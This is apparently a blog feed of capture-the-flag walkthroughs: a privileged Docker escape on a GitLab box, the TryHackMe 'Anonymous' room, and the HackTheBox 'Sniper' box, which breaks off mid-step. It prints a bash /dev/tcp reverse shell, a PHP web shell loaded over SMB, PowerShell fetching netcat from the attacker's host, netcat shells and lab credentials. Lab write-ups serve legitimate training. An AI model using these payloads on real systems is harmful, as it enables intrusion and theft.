&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In short, if a docker container is configured with the &lt;code&gt;--privilaged&lt;/code&gt; flag then this means that any protections afforded to the container, by Docker, are lost and a root user can easily access the host file system. Checking the current mount points:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay          18G   12G  5.7G  68% /
tmpfs            64M     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   64M   0% /dev
tmpfs           2.0G     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  2.0G   0% /sys/fs/cgroup
/dev/sda2        18G   12G  5.7G  68% /root_pass
shm              64M  2.3M   62M   4% /dev/shm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This shows that &lt;code&gt;/dev/sda2&lt;/code&gt; maps to the &lt;code&gt;/root_pass&lt;/code&gt; file and, as per the docker compose file, this is used for (likely) initial configuration of the container. The important bit is that it shows the block device the file resides on, meaning that it can quite easily be mounted:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# mkdir /mnt/hdd
root@gitlab:/opt/backup# mount /dev/sda2 /mnt/hdd
root@gitlab:/opt/backup# ls -la /mnt/hdd/root/root.txt
-r-------- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Jul  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; root.txt
root@gitlab:/opt/backup#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And with that, access to the root filesystem (along with its associated SSH keys) is granted.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;credentials-store&#34;&gt;Credentials Store&lt;/h1&gt;
&lt;p&gt;Here are a list of credentials obtained during this exercise:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;User&lt;/th&gt;
&lt;th&gt;Password&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;root&lt;/td&gt;
&lt;td&gt;wW59U!ZKMbG9+*#h&lt;/td&gt;
&lt;td&gt;Root password - GitLab Docker container. Obtained via LinPEAS grabbing the &lt;code&gt;smtp_password&lt;/code&gt; value from the gitlab_rails config.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;If you&amp;rsquo;re at least semi-experienced, this box will most likely have been a total cinch for you. I know I didn&amp;rsquo;t really need to do a whole lot of work from start to finish&amp;ndash; frankly, it&amp;rsquo;s one of the easiest boxes in recent memory.&lt;/p&gt;
&lt;p&gt;All that said, there&amp;rsquo;s still a tonne of value in things like this. If you&amp;rsquo;re seasoned, you just got to ensure you&amp;rsquo;ve not just casually forgotten basic things. If you&amp;rsquo;re new to the field, this can easily provide a challenge, especially to those unfamiliar with Docker and its configurations. Let the lesson be: privilaged containers are bad. Until next time!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-5ysk3y&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Anonymous - Linux</title>
      <link>https://5ysk3y.github.io/thm/guides/anonymous/</link>
      <pubDate>Tue, 19 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/thm/guides/anonymous/</guid>
      <description>Overview Welcome to this walkthrough of the TryHackMe room, Anonymous .
This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/anonymous.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Welcome to this walkthrough of the &lt;a href=&#34;https://tryhackme.com&#34; target=&#34;_blank&#34;&gt;TryHackMe&lt;/a&gt;
 room, &lt;a href=&#34;https://tryhackme.com/room/anonymous&#34; target=&#34;_blank&#34;&gt;Anonymous&lt;/a&gt;
.&lt;/p&gt;
&lt;p&gt;This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As always we begin our enumeration with an NMAP scan. I&amp;rsquo;ve condensed it slightly to lessen the output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable

22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)

139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;There&amp;rsquo;s two services that peaked my interest off the bat; FTP and SMB. Looking at both, they allow anonymous access. If we check SMB first, we can see a couple of files in a &lt;code&gt;pics&lt;/code&gt; share - downloading them and running them through &lt;code&gt;binwalk&lt;/code&gt; doesn&amp;rsquo;t show any hidden data. For now, we&amp;rsquo;ll assume this is intended as a distraction.&lt;/p&gt;
&lt;p&gt;Turning to FTP, there&amp;rsquo;s a few files we can see through our anonymous login. A shell script, a log file and a text file. The latter txt file outlines how &lt;code&gt;anonymous&lt;/code&gt; access should probably be disabled in the form of a note from the author&amp;ndash; I&amp;rsquo;d agree. The log file we see is exactly that as it contains log entries. Finally we have a shell script called &lt;code&gt;clean.sh&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-rwxr-xrwx    1 1000     1000          346 May 19 18:31 clean.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Reading the scripts contents, we can see that this file is responsible for updating the log file we found:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
echo $tmp_files
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running cleanup script:  nothing to delete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; LINE in $tmp_files; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
        rm -rf /tmp/$LINE &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; | Removed file /tmp/&lt;/span&gt;$LINE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Its a simple if/else statement that executes an echo statment that gets redirected into our log, based on the value of a defined variable. What the script is doing isn&amp;rsquo;t actually the important bit, the important bit is that, as well as read access to the file, also have permission to modify it. Attempts to download the script locally, modify it and re-upload seemingly failed, likely because the re-uploaded file doesn&amp;rsquo;t retain the right user permissions&amp;ndash; by default the file is owned by UID/GID 1000, if we re-upload the file this number changes to something else.&lt;/p&gt;
&lt;p&gt;That said, we can modify files directly on the FTP server. I used &lt;code&gt;lftp&lt;/code&gt; here because I have mad issues with the standard Linux FTP binary if active mode is being used (it&amp;rsquo;s a FW problem I&amp;rsquo;ve not fixed yet):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lftp anonymous@10.10.210.243:/scripts&amp;gt; edit clean.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This opens the file up in vim &amp;ndash; note this is a local instance of vim, so breaking out of it is going to put you into a shell on your own local machine &amp;ndash; and from there we can edit it. For testing purposes I added a simple cURL command to the bottom of the file:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl 10.11.x.x/test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Initially I thought things weren&amp;rsquo;t working until suddenly I got this through on my Python listener:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:45:03] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now, if we look at the time this occured we can see it was just after the 45th minute of the current hour - I left it and observed to see when, if at all, we got another hit and low and behold:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:50:04] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This should make it apparant that there&amp;rsquo;s something (we can assume it is a cron) running this script every 5 minutes. That makes the wait time between changes a bit painful but we have confirmed we can execute code. As I don&amp;rsquo;t trust 99% of rooms to contain a copy of &lt;code&gt;nc&lt;/code&gt; that includes the &lt;code&gt;-e&lt;/code&gt; executable flag, I decided to try a BASH specific method to get a shell, as we&amp;rsquo;re modifying a bash script. This is a method listed under the &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34; target=&#34;_blank&#34;&gt;Pentest Monkey CheatSheet&lt;/a&gt;
:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Replacing this with my relevant IP and a port with an active listener, I waited until I finally got a connection:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
bash: cannot set terminal process group (1451): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ whoami
namelessone
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gets us some shell access and the user.txt flag.&lt;/p&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Next up, as is standard practice whilst I poke around, I set off &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&#34; target=&#34;_blank&#34;&gt;linPEAS&lt;/a&gt;
 - this actually highlighted our privilage escalation vector. Reading though the output of a completed scan, I could see a particularly interesting binary listed under SUID binaries found on the system:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/bin/env&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is not a typical SUID binary on a Linux system and having it as one is a good way to allow abuse to occur. If we run the name of this binary, &lt;code&gt;env&lt;/code&gt;, through the ever-popular &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/&#34; target=&#34;_blank&#34;&gt;GTFOBins&lt;/a&gt;
 we can see that this can be used to gain access to root if the SUID bit is set. To take advantage of this we can run the following from our current user shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Note that unless you have a full TTY you likely won&amp;rsquo;t get any output once you&amp;rsquo;ve elevated to root, but commands will still run. You&amp;rsquo;ll also retain your UID/GID, but the EUID (effective user-ID) will be set to root, which means you&amp;rsquo;re basically root. This will enable you to go and grab the root flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;TL;DR - keep it simple and be careful and this room shouldn&amp;rsquo;t give you too much trouble.&lt;/p&gt;
&lt;p&gt;This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&amp;rsquo;t personally say it&amp;rsquo;s that hard. It&amp;rsquo;s more about observation and ensuring that you&amp;rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Sniper [Medium] - Windows</title>
      <link>https://5ysk3y.github.io/htb/guides/sniper/</link>
      <pubDate>Sun, 29 Mar 2020 16:21:41 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/sniper/</guid>
      <description>Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/sniper.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;First up, from my standard nmap scan, we see :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151

Nmap scan report for 10.10.10.151
Host is up, received echo-reply ttl 127 (0.017s latency).
Scanned at 2019-10-08 17:54:45 BST for 60s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=10/8%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5D9CBF91%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m47s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 25157/tcp): CLEAN (Timeout)
|   Check 2 (port 18459/tcp): CLEAN (Timeout)
|   Check 3 (port 51336/udp): CLEAN (Timeout)
|   Check 4 (port 40243/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-08T23:55:52
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   16.83 ms 10.10.14.1
2   16.86 ms 10.10.10.151

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  8 17:55:45 2019 -- 1 IP address (1 host up) scanned in 59.98 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;For the most part there&amp;rsquo;s only the web port, so lets start by checking that out:&lt;/p&gt;
&lt;p&gt;http://10.10.10.151/&lt;/p&gt;
&lt;p&gt;Nothing special in the source. There&amp;rsquo;s 2 links that lead off here:&lt;/p&gt;
&lt;p&gt;http://10.10.10.151/blog/
http://10.10.10.151/user/&lt;/p&gt;
&lt;p&gt;The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment, but we&amp;rsquo;ll revisit that shortly. I also took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m also running full dirb scans of the /blog and /user URL&amp;rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration to ensure it scans everything it can, but it doesn&amp;rsquo;t give further results.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
/blog (Status: 200)
/index.php (Status: 200)
/user (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger. This appears to be a bit of dead end though.&lt;/p&gt;
&lt;p&gt;On top of this, as briefly mentioned, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/blog/?lang=blog-&amp;lt;lang&amp;gt;.php &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Where &lt;code&gt;lang&lt;/code&gt; is (e.g.) en, fr, es. I&amp;rsquo;ve attempted to fuzz the parameter to some success; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&amp;rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types but nothing has come back from that.&lt;/p&gt;
&lt;p&gt;After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html&#34; target=&#34;_blank&#34;&gt;RFI using PHP/SMB&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&amp;rsquo;ve setup an SMB share and inside it I&amp;rsquo;ve got a file called hax.php (yes, I know, Its leet). Quite simply, it contains this:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;For posterity the following also reflects the codeblock used in my smb.conf file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[share]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e&#34; target=&#34;_blank&#34;&gt;Sniper Gist by 5ysk3y&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;To exploit this using this script we call our malicious file via the SMB share in the url as follows:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This returns the HTML elements of the script, when we view the source; to use it, we append &lt;code&gt;&amp;amp;cmd=some+command+here&lt;/code&gt; to the url (make sure to change the request type to POST as well).&lt;/p&gt;
&lt;p&gt;From there, we can run commands, e.g:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&amp;amp;cmd=dir ..\user\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          .
10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          ..
04/11/2019  05:15 PM               108 auth.php
04/11/2019  05:52 AM    &amp;lt;DIR&amp;gt;          css
04/11/2019  10:51 AM               337 db.php
04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          fonts
04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          images
04/11/2019  06:18 AM             4,639 index.php
04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          js
04/11/2019  06:10 AM             6,463 login.php
04/08/2019  11:04 PM               148 logout.php
10/01/2019  08:42 AM             7,192 registration.php
08/14/2019  10:35 PM             7,004 registration_old123123123847.php
04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          vendor
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&amp;ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement, including creds, that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$con = mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;dbuser&amp;quot;,&amp;quot;36mEAhz/B8xQ~2VM&amp;quot;,&amp;quot;sniper&amp;quot;);
$query = &amp;quot;SELECT * from users&amp;quot;;
$result = mysqli_query($con,$query);

while($output = mysqli_fetch_array($result)) {
		print_r($output);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hopefully this is fairly self explanatory; I lifted the $con variable from the server-side copy of db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Array
(
	[0] =&amp;gt; 12
	[id] =&amp;gt; 12
	[1] =&amp;gt; 5ysk3y
	[username] =&amp;gt; 5ysk3y
	[2] =&amp;gt; a@b.c
	[email] =&amp;gt; a@b.c
	[3] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
	[password] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
	[4] =&amp;gt; 2019-10-14 01:54:13
	[trn_date] =&amp;gt; 2019-10-14 01:54:13
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the superuser password hash:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Array
(
	[0] =&amp;gt; 1
	[id] =&amp;gt; 1
	[1] =&amp;gt; superuser
	[username] =&amp;gt; superuser
	[2] =&amp;gt; admin@sniper.co
	[email] =&amp;gt; admin@sniper.co
	[3] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
	[password] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
	[4] =&amp;gt; 2019-04-11 22:45:36
	[trn_date] =&amp;gt; 2019-04-11 22:45:36
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are more, likely from signups from other HTB users, so I&amp;rsquo;ve dumped them all for reference. I grabbed my own registered password hash to see if I can crack it (since I know what the pass is) before I move onto super user.&lt;/p&gt;
&lt;p&gt;Also, I have used my wrapper script to enum the users on this box:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;04/09/2019  06:47 AM    &amp;lt;DIR&amp;gt;          Administrator
04/11/2019  07:04 AM    &amp;lt;DIR&amp;gt;          Chris

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly I cant dir the contents but non the less! I&amp;rsquo;ve also just realised that the old registration form tells us exactly what type of format the DB passwords are stored in, as its inserted in the following manner:&lt;/p&gt;
&lt;p&gt;.md5($password).&lt;/p&gt;
&lt;p&gt;So its an MD5 hash. Lets try to crack our own! Hashcat got it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
5f4dcc3b5aa765d61d8327deb882cf99:password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly the sysadmin password didnt seem to crack quite as easily - SSH isnt available on this server as it&amp;rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell the better.&lt;/p&gt;
&lt;p&gt;In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Upload nc64 (windows netcat, using this specific command):&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Windows\\temp\\nc64.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&#39; username with the MySQL password we found earlier does yield results. Let&amp;rsquo;s setup our credential object so we can privesc:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$user = &amp;quot;SNIPER\Chris&amp;quot;
$pass = ConvertTo-SecureString &amp;quot;36mEAhz/B8xQ~2VM&amp;quot; -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then use it to execute code as Chris&#39; user, e.g:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\inetpub\wwwroot\blog&amp;gt; Invoke-Command -ComputerName SNIPER -ScriptBlock { whoami } -Credential $creds
sniper\chris
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there I downloaded another copy of nc64.exe that would be owned by Chris:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Users\\Chris\\Documents\\nc64.exe } -Credential $creds
